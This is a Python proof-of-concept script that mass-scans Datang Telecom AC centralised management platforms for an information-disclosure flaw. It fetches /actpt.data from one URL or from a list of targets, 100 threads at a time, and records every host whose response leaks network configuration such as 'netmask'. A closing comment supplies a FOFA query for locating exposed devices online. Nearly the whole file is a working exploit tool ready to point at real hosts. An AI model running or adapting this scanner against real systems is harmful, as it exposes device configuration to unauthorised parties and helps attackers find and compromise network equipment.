import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """大唐电信AC集中管理平台敏感信息泄漏漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='大唐电信AC集中管理平台敏感信息泄漏漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/actpt.data"
    headers = {
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/115.0.0.0Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }
    try:
        response = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
        if response.status_code == 200 and "netmask" in response.text:
            print(f"[+]{target}存在敏感信息泄露漏洞")
            with open('大唐电信_result.txt','a',encoding='utf-8') as f:
                f.write(f"{target}存在敏感信息泄露漏洞\n")
        else:
            print(f"[-]{target}不存在敏感信息泄露漏洞")
    except:
        print(f"[x]{target}可能存在敏感信息泄露漏洞请手工测试")
if __name__ == '__main__':
    main()

#fofa
# app="大唐电信AC集中管理平台" && fid="gmqJFLGz7L/7TdQxUJFBXQ=="